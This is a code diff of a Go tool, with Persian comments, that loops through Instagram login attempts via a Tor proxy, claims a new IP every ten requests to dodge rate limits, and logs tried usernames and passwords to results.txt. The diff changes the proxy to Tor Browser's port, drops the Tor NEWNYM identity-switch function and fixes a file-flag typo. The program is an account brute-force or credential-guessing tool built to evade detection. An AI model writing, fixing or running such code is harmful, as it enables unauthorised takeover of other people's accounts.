@@ -20,9 +20,9 @@ const (
 	API_URL      = "https://i.instagram.com/api/v1/"
 	USER_AGENT   = "Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)"
 	TIMEOUT      = 10 * time.Second
-	CURRENT_TIME = "2025-05-23 23:29:32"
+	CURRENT_TIME = "2025-05-23 23:37:55"
 	CURRENT_USER = "monsmain"
-	TOR_PROXY    = "socks5://127.0.0.1:9050"
+	TOR_PROXY    = "socks5://127.0.0.1:9150"  // پورت Tor Browser
 )
 
 type InstagramResponse struct {
@@ -51,7 +51,7 @@ func main() {
 	client, err := getTorClient()
 	if err != nil {
 		fmt.Printf("❌ Error connecting to Tor: %v\n", err)
-		fmt.Println("Please make sure Tor is running on port 9050")
+		fmt.Println("Please make sure Tor Browser is running!")
 		return
 	}
 	fmt.Println("✅ Successfully connected to Tor\n")
@@ -74,14 +74,10 @@ func main() {
 		
 		// تغییر IP هر 10 درخواست
 		if i > 0 && i%10 == 0 {
-			fmt.Println("\n🔄 Changing Tor identity...")
-			if err := newTorIdentity(); err != nil {
-				log.Printf("Error changing Tor identity: %v\n", err)
-				fmt.Println("⚠️ Failed to change Tor identity")
-			} else {
-				fmt.Println("✅ Successfully changed Tor identity")
-			}
+			fmt.Println("\n🔄 Getting new Tor circuit...")
+			// برای Tor Browser نیازی به تغییر دستی مسیر نیست
 			time.Sleep(5 * time.Second)
+			fmt.Println("✅ Ready with new IP")
 		}
 
 		success, response := tryLogin(username, password)
@@ -129,19 +125,6 @@ func getTorClient() (*http.Client, error) {
 		Transport: transport,
 		Timeout:   TIMEOUT,
 	}, nil
-}
-
-func newTorIdentity() error {
-	controlConn, err := net.Dial("tcp", "127.0.0.1:9051")
-	if err != nil {
-		return err
-	}
-	defer controlConn.Close()
-
-	fmt.Fprintf(controlConn, "AUTHENTICATE \"\"\r\n")
-	fmt.Fprintf(controlConn, "SIGNAL NEWNYM\r\n")
-
-	return nil
 }
 
 func tryLogin(username, password string) (bool, InstagramResponse) {
@@ -231,7 +214,7 @@ func saveResult(username, password string, success bool) {
 	logEntry := fmt.Sprintf("[%s] %s\nUsername: %s\nPassword: %s\n\n", 
 		currentTime, status, username, password)
 	
-	file, err := os.OpenFile("results.txt", os.O_APPEND|os.O_CREATE|O_WRONLY, 0644)
+	file, err := os.OpenFile("results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		log.Printf("Error saving result: %v", err)
 		return
